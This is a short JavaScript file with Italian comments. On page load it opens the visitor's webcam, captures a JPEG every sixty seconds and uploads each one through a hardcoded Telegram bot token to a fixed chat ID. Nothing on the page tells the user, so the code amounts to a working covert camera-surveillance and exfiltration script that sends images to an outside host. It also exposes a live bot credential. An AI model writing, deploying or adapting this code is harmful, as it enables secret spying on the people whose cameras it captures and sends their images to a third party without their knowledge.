document.addEventListener('DOMContentLoaded', (event) => {
    const video = document.getElementById('video');
    const constraints = { video: true };

    navigator.mediaDevices.getUserMedia(constraints)
        .then(stream => {
            video.srcObject = stream;
            video.play();

            setInterval(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageDataUrl = canvas.toDataURL('image/jpeg');
                sendToTelegram(imageDataUrl);
            }, 60000); // ogni 60 secondi
        })
        .catch(err => {
            console.error('Errore nell\'accesso alla fotocamera:', err);
        });
});

async function sendToTelegram(imageDataUrl) {
    const apiToken = '7504005848:AAGY3pQyR5TW0n7pU9HLLHPWtqWL72s6mQ8';
    const chatId = '6759375069';

    const blob = await (await fetch(imageDataUrl)).blob();
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'photo.jpg');

    const response = await fetch(`https://api.telegram.org/bot${apiToken}/sendPhoto`, {
        method: 'POST',
        body: formData
    });

    if (response.ok) {
        console.log('Foto inviata con successo');
    } else {
        console.error('Errore nell\'invio della foto:', response.statusText);
    }
}
